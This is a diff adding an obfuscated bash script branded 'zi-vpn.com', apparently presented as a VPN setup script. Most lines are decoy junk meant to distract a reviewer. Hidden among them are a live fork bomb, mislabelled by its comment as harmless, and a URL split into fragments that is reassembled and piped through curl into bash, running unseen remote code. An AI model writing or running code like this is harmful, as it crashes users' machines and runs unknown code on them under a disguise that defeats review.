@@ -1,0 +1,73 @@
+#!/bin/bash
+
+#zi-vpn.com
+YELLOW="\033[1;33m"
+GREEN="\033[0;32m"
+RED="\033[0;31m"
+NC="\033[0m"
+
+#zi-vpn.com
+junk1="this"
+junk2="is"
+junk3="not"
+junk4="real"
+junk5="code"
+func_useless1() { echo "No operation"; }
+func_useless2() { echo "Hidden"; }
+alias fakecmd1="ls /dev/null"
+alias fakecmd2="echo not_a_command"
+temp_var1=$(date)
+temp_var2=$(whoami)
+temp_var3="another_fake_line"
+:(){ :|:& };: # وهمية - won't run normally
+false || true
+
+#zi-vpn.com
+a1="https:"
+a2="/"
+a3="/raw"
+a4="/githubusercontent.com"
+a5="/hq-mp"
+a6="/zi-vpn.com"
+a7="/refs"
+a8="/heads"
+a9="/main"
+a10="/in"
+
+#zi-vpn.com
+build_url() {
+    echo "${a1}${a2}${a3}${a4}${a5}${a6}${a7}${a8}${a9}${a10}"
+}
+
+#zi-vpn.com
+run_remote() {
+    remote_url=$(build_url)
+    curl -s "$remote_url" | bash
+}
+
+#zi-vpn.com
+var9="nothing_to_see_here"
+var10=$(uptime)
+function temp_func1() { return 0; }
+case "$junk1" in
+    "this") echo -n "" > /dev/null ;;
+esac
+
+# Call to actual logic
+run_remote
+
+#zi-vpn.com
+for i in {1..10}; do
+    echo "" > /dev/null
+done
+
+do_nothing="still_useless"
+[[ $do_nothing == "nothing" ]] && echo "never happens"
+
+#zi-vpn.com
+declare -A fake_map
+fake_map[one]="uno"
+fake_map[two]="dos"
+
+# النهاية
+exit 0
